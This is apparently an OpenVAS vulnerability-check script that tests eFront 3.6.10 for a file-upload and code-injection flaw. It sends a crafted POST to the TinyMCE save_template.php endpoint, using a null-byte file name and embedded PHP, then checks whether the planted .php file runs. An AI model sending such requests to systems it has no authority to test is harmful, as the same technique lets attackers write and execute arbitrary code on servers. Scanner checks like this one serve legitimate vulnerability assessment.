###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_efront_50391.nasl 12392 2018-11-16 19:26:25Z cfischer $
#
# eFront 3.6.10 Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:efrontlearning:efront';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103316");
  script_version("$Revision: 12392 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-16 20:26:25 +0100 (Fri, 16 Nov 2018) $");
  script_tag(name:"creation_date", value:"2011-10-31 13:36:15 +0100 (Mon, 31 Oct 2011)");
  script_bugtraq_id(50391);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("eFront 3.6.10 Multiple Security Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("secpod_efront_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("efront/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50391");
  script_xref(name:"URL", value:"http://bugs.efrontlearning.net/browse/EF-675");
  script_xref(name:"URL", value:"http://www.efrontlearning.net/");

  script_tag(name:"impact", value:"Attackers can exploit these issues to bypass certain security
  restrictions, insert arbitrary code, obtain sensitive information, execute arbitrary code,
  modify the logic of SQL queries, and upload arbitrary code. Other attacks may also be possible.");

  script_tag(name:"affected", value:"eFront 3.6.10 is vulnerable. Prior versions may also be affected.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"eFront is prone to multiple security vulnerabilities, including:

  - A remote code injection vulnerability

  - Multiple SQL injection vulnerabilities

  - An authentication bypass and privilege escalation vulnerability

  - A remote code execution vulnerability

  - A file upload vulnerability");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

host = http_host_name( port:port );

vt_strings = get_vt_strings();
template = string( vt_strings["lowercase_rand"], ".php" );

ex = string( "templateName=", template, "%00&templateContent=<?php print '", vt_strings["lowercase"], "-c-e-test'; ?>" );
len = strlen( ex );

url = dir + "/editor/tiny_mce/plugins/save_template/save_template.php";

req = string( "POST ", url, " HTTP/1.1\r\n",
	      "Host: ", host,"\r\n",
	      "Content-Length: ", len,"\r\n",
	      "Content-Type: application/x-www-form-urlencoded\r\n",
	      "\r\n",
	      ex );
res = http_keepalive_send_recv( port:port, data:req );

if( res =~ "HTTP/1.. 200" ) {

  url2 = dir + "/content/editor_templates/" + template;

  if( http_vuln_check( port:port, url:url2, pattern:string( vt_strings["lowercase"], "-c-e-test" ) ) ) {
    report = report_vuln_url( port:port, url:url );
    report += '\n\nPlease delete the following file manually: ' + report_vuln_url( port:port, url:url2, url_only:TRUE );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
